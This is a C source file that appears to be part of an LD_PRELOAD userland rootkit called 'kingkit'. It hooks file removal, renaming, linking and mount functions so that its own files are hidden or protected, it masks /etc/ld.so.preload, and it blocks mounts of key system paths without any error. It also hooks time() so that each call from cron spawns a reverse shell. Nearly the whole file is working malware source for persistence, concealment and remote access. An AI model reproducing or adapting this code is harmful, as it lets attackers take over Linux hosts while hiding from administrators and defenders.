	printf("[kingkit] remove called with pathname: %s.\n", pathname);
    #endif
    original_remove = syscall_address(original_remove, "remove");
    char *real_pathname = realpath(pathname, NULL);
    if (real_pathname == NULL) //catch errors like ENOENT
        return (*original_remove)(pathname);
    if (is_protected(real_pathname)) {
        free(real_pathname);
        errno = EPERM;
        return -1;
    }
    else if (!strcmp(real_pathname, "/etc/ld.so.preload"))
        pathname = FAKE_PRELOAD;
    else if (is_hidden(real_pathname)) {
        free(real_pathname);
        errno = ENOENT;
        return -1;
    }
    free(real_pathname);
    return (*original_remove)(pathname);
}


int unlink(const char *pathname) {
    #if DEBUG
	printf("[kingkit] unlink called with pathname: %s.\n", pathname);
    #endif
    original_unlink = syscall_address(original_unlink, "unlink");
    char *real_pathname = realpath(pathname, NULL);
    if (real_pathname == NULL) //catch errors like ENOENT
        return (*original_unlink)(pathname);
    if (is_protected(real_pathname)) {
        free(real_pathname);
        errno = EPERM;
        return -1;
    } else if (!strcmp(real_pathname, "/etc/ld.so.preload"))
        pathname = FAKE_PRELOAD;
    else if (is_hidden(real_pathname)) {
        free(real_pathname);
        errno = ENOENT;
        return -1;
    }
    free(real_pathname);
    return (*original_unlink)(pathname);
}


int unlinkat(int dirfd, const char *pathname, int flags) {
    #if DEBUG
	printf("[kingkit] unlinkat called with pathname: %s.\n", pathname);
    #endif
    original_unlinkat = syscall_address(original_unlinkat, "unlinkat");
    char *real_pathname = dirfd_pathname_to_path(dirfd, pathname);
    if (real_pathname == NULL)
        return (*original_unlinkat)(dirfd, pathname, flags);
    if (is_protected(real_pathname)) {
        free(real_pathname);
        errno = EPERM;
        return -1;
    } else if (!strcmp(real_pathname, "/etc/ld.so.preload"))
        pathname = FAKE_PRELOAD;
    else if (is_hidden(real_pathname)) {
        free(real_pathname);
        errno = ENOENT;
        return -1;
    }
    free(real_pathname);
    return (*original_unlinkat)(dirfd, pathname, flags);
}


int rename(const char *oldpath, const char *newpath) {
    #if DEBUG
	printf("[kingkit] rename called with oldpath: %s and newpath: %s.\n", oldpath, newpath);
    #endif
    original_rename = syscall_address(original_rename, "rename");
    char *real_oldpath = realpath(oldpath, NULL);
    char *real_newpath = realpath(newpath, NULL);
    if (real_oldpath == NULL || real_newpath == NULL) {
        free(real_oldpath);
        free(real_newpath);
        return (*original_rename)(oldpath, newpath);
    }
    if (is_protected(real_oldpath) || is_protected(real_newpath)) {
        free(real_oldpath);
        free(real_newpath);
        errno = EPERM;
        return -1;
    }
    if (!strcmp(oldpath, "/etc/ld.so.preload"))
        oldpath = FAKE_PRELOAD;
    else if (is_hidden(real_oldpath)) {
        free(real_oldpath);
        free(real_newpath);
        errno = ENOENT;
        return -1;
    }
    if (!strcmp(real_newpath, "/etc/ld.so.preload"))
        newpath = FAKE_PRELOAD;
    else if (is_hidden(real_newpath)) {
        original_remove = syscall_address(original_remove, "remove");
        free(real_oldpath);
        free(real_newpath);
        return (*original_remove)(oldpath); //do this after oldpath is renamed in case it's /etc/ld.so.preload!!
    }
    free(real_oldpath);
    free(real_newpath);
    return (*original_rename)(oldpath, newpath);
}


int renameat(int olddirfd, const char *oldpath, int newdirfd, const char *newpath) {
    #if DEBUG
	printf("[kingkit] renameat called with olddirfd: %d and oldpath: %s and newdirfd: %d and newpath: %s.\n", olddirfd, oldpath, newdirfd, newpath);
    #endif
    original_renameat = syscall_address(original_renameat, "renameat");
    char *real_oldpath = dirfd_pathname_to_path(olddirfd, oldpath);
    char *real_newpath = dirfd_pathname_to_path(newdirfd, newpath);
    if (real_oldpath == NULL || real_newpath == NULL) {
        free(real_oldpath);
        free(real_newpath);
        return (*original_renameat)(olddirfd, oldpath, newdirfd, newpath);
    }
    if (is_protected(real_oldpath) || is_protected(real_newpath)) {
        free(real_oldpath);
        free(real_newpath);
        errno = EPERM;
        return -1;
    }
    if (!strcmp(oldpath, "/etc/ld.so.preload"))
        oldpath = FAKE_PRELOAD;
    else if (is_hidden(real_oldpath)) {
        free(real_oldpath);
        free(real_newpath);
        errno = ENOENT;
        return -1;
    }
    if (!strcmp(real_newpath, "/etc/ld.so.preload"))
        newpath = FAKE_PRELOAD;
    else if (is_hidden(real_newpath)) {
        original_remove = syscall_address(original_remove, "remove");
        free(real_oldpath);
        free(real_newpath);
        return (*original_remove)(real_oldpath); //do this after oldpath is renamed in case it's /etc/ld.so.preload!!
    }
    free(real_oldpath);
    free(real_newpath);
    return (*original_renameat)(olddirfd, oldpath, newdirfd, newpath);
}


int renameat2(int olddirfd, const char *oldpath, int newdirfd, const char *newpath, unsigned int flags) {
    #if DEBUG
	printf("[kingkit] renameat2 called with olddirfd: %d and oldpath: %s and newdirfd: %d and newpath: %s.\n", olddirfd, oldpath, newdirfd, newpath);
    #endif
    original_renameat2 = syscall_address(original_renameat2, "renameat2");
    char *real_oldpath = dirfd_pathname_to_path(olddirfd, oldpath);
    char *real_newpath = dirfd_pathname_to_path(newdirfd, newpath);
    if (real_oldpath == NULL || real_newpath == NULL) {
        free(real_oldpath);
        free(real_newpath);
        return (*original_renameat2)(olddirfd, oldpath, newdirfd, newpath, flags);
    }
    if (is_protected(real_oldpath) || is_protected(real_newpath)) {
        free(real_oldpath);
        free(real_newpath);
        errno = EPERM;
        return -1;
    }
    if (!strcmp(oldpath, "/etc/ld.so.preload"))
        oldpath = FAKE_PRELOAD;
    else if (is_hidden(real_oldpath)) {
        free(real_oldpath);
        free(real_newpath);
        errno = ENOENT;
        return -1;
    }
    if (!strcmp(real_newpath, "/etc/ld.so.preload"))
        newpath = FAKE_PRELOAD;
    else if (is_hidden(real_newpath)) {
        original_remove = syscall_address(original_remove, "remove");
        free(real_oldpath);
        free(real_newpath);
        return (*original_remove)(real_oldpath); //do this after oldpath is renamed in case it's /etc/ld.so.preload!!
    }
    free(real_oldpath);
    free(real_newpath);
    return (*original_renameat2)(olddirfd, oldpath, newdirfd, newpath, flags);
}


int link(const char *oldpath, const char *newpath) {
    #if DEBUG
    printf("[kingkit] link called with oldpath: %s and newpath: %s.\n", oldpath, newpath);
    #endif
    original_link = syscall_address(original_link, "link");
    char *real_oldpath = realpath(oldpath, NULL);
    if (real_oldpath == NULL) {
        return (*original_link)(oldpath, newpath);
    }
    if (is_protected(real_oldpath)) {
        free(real_oldpath);
        errno = EPERM;
        return -1;
    } else if (!strcmp(real_oldpath, "/etc/ld.so.preload")) {
        oldpath = FAKE_PRELOAD;
    } else if (is_hidden(real_oldpath)) {
        free(real_oldpath);
        errno = ENOENT;
        return -1;
    }
    free(real_oldpath);
    return (*original_link)(oldpath, newpath);
}


int linkat(int olddirfd, const char *oldpath, int newdirfd, const char *newpath, int flags) {
    #if DEBUG
	printf("[kingkit] linkat called with olddirfd: %d and oldpath: %s and newdirfd: %d and newpath: %s and flags: %d.\n", olddirfd, oldpath, newdirfd, newpath, flags);
    #endif
    original_linkat = syscall_address(original_linkat, "linkat");
    char *real_oldpath = dirfd_pathname_to_path(olddirfd, oldpath);
    if (real_oldpath == NULL) {
        return (*original_linkat)(olddirfd, oldpath, newdirfd, newpath, flags);
    }
    if (is_protected(real_oldpath)) {
        free(real_oldpath);
        errno = EPERM;
        return -1;
    } else if (!strcmp(real_oldpath, "/etc/ld.so.preload")) {
        oldpath = FAKE_PRELOAD;
    } else if (is_hidden(real_oldpath)) {
        free(real_oldpath);
        errno = ENOENT;
        return -1;
    }
    free(real_oldpath);
    return (*original_linkat)(olddirfd, oldpath, newdirfd, newpath, flags);
}


int mount(const char *source, const char *target, const char *filesystemtype, unsigned long mountflags, const void *data) {
    #if DEBUG
	printf("[kingkit] mount called with source: %s and target: %s.\n", source, target);
    #endif
    original_mount = syscall_address(original_mount, "mount");
    char *real_source = realpath(source, NULL);
    char *real_target = realpath(target, NULL);
    if (real_source == NULL || real_target == NULL) {
        free(real_source);
        free(real_target);
        return (*original_mount)(source, target, filesystemtype, mountflags, data);
    }
    if (!strcmp(real_source, "/") ||
        !strcmp(real_source, "/dev") ||
        !strcmp(real_source, "/lib") ||
        !strcmp(real_source, "/etc") ||
        !strncmp(real_source, "/proc", 5) ||
        !strcmp(real_source, "/root") ||
        !strcmp(real_source, "/dev/xvda1") ||
        !strcmp(real_source, "/") ||
        is_protected(real_source) ||
        is_hidden(real_source) ||
        !strcmp(real_target, "/") ||
        !strcmp(real_target, "/dev") ||
        !strcmp(real_target, "/lib") ||
        !strcmp(real_target, "/etc") ||
        !strncmp(real_target, "/proc", 5) ||
        !strcmp(real_target, "/root") ||
        !strcmp(real_target, "/dev/xvda1") ||
        !strcmp(real_target, "/") ||
        is_protected(real_target) ||
        is_hidden(real_target)
    ) { // /dev/xvda1 is a common device for the root filesystem
        free(real_source);
        free(real_target);
        return 0; //exit silently
    }
    free(real_source);
    free(real_target);
    return (*original_mount)(source, target, filesystemtype, mountflags, data);
}


static time_t last_time = 0; //time the last reverse shell was spawned

time_t time(time_t *tloc) {
    #if DEBUG
    printf("[kingkit] time called.\n");
    #endif
    original_time = syscall_address(original_time, "time");
    char exe_path[PATH_MAX];
    ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1); //look which binary is associated with this process
    if (len == -1) {
        return (*original_time)(tloc);
    }
    exe_path[len] = '\0'; //terminate the string because readlink itself doesn't do that
    if (strncmp(exe_path, "/usr/sbin/cron", 14) == 0) { //check if cron is calling time()
        time_t current_time = (*original_time)(NULL);
        if (last_time < (current_time - 50)) { //avoid spawning multiple reverse shells, otherwise cron will recursively call time()
            last_time = current_time; //update the last_time variable
            revshell(); //if so, spawn reverse shell
        }
        return current_time; //avoid an extra call to time()
    }
    return (*original_time)(tloc);
}
